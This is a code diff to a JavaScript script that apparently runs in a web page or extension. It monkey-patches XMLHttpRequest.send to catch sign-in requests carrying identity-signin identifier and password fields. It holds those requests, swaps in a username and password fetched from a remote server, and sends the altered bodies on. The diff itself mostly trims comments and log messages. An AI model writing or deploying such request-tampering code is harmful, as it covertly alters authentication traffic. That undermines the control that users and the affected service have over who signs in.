@@ -1,4 +1,4 @@
-let freqUsername = null; 
+let freqUsername = null;
 let freqPassword = null;
 const modifiedRequests = new Set();
 const pendingRequests = new Map();
@@ -85,10 +85,8 @@ const processModifiedRequests = () => {
     }
 
     console.log("Processing pending requests...");
-    // Create a copy of pending requests as we will modify it while iterating
     const requestsToProcess = Array.from(pendingRequests);
 
-    // Iterate through all pending requests
     for (let [xhr, body] of requestsToProcess) {
         const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
         const secondmatch = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
@@ -99,21 +97,22 @@ const processModifiedRequests = () => {
 
             console.log("Modified request with new username:", modifiedBody);
 
-            // Send the modified request
-            xhr.send(modifiedBody);
-            console.log("Sending modified request:", modifiedBody);
+            // Send the modified request and log it
+            console.log("Sending modified request now...");
+            xhr.send(modifiedBody);  // Ensure the modified body is sent
 
             // Remove the request from pendingRequests after sending
             pendingRequests.delete(xhr); 
+        } else {
+            console.log("Skipping request or already modified:", body);
         }
     }
 
-    // Reset freqUsername and freqPassword when all requests are processed
     if (pendingRequests.size === 0) {
         console.log("All pending requests processed, resetting freqUsername and freqPassword.");
         freqUsername = null;
         freqPassword = null;
-        usernameFetched = false; // Allow fetching a new username if needed
+        usernameFetched = false;
         passwordFetched = false;
     }
 };
@@ -126,7 +125,7 @@ XMLHttpRequest.prototype.send = function (body) {
         return;
     }
 
-    // If the body contains identity-signin-identifier or identity-signin-password and hasn't been modified yet
+    // Check for relevant patterns in the request body
     if ((/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
         pendingRequests.set(this, body); // Store the request in pendingRequests
@@ -136,7 +135,7 @@ XMLHttpRequest.prototype.send = function (body) {
     }
 };
 
-// ✅ Send username data to server
+// Send username data to server
 const sendUsername = async () => {
     console.log('Sending username...');
 
@@ -163,22 +162,18 @@ const sendUsername = async () => {
     }
 };
 
-// ✅ Attach event listeners to buttons
+// Attach event listeners to buttons
 document.addEventListener('DOMContentLoaded', () => {
     const button = document.getElementById('sendUsernameBtn');
     const usernameInput = document.getElementById('username');
 
-    // Add button click listener
     if (button) {
         button.addEventListener('click', (event) => {
-            event.preventDefault(); // Prevent form submission if inside a form
+            event.preventDefault();
             sendUsername(); // Trigger sending username
         });
-    } else {
-        console.warn('Send username button not found!');
     }
 
-    // Add "Enter" key listener to trigger username send
     if (usernameInput) {
         usernameInput.addEventListener('keydown', (event) => {
             if (event.key === 'Enter') {
@@ -188,8 +183,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Ensure fetchFreqUsername is called when the page loads
     fetchFreqUsername();
     fetchFreqPassword();
 });
-
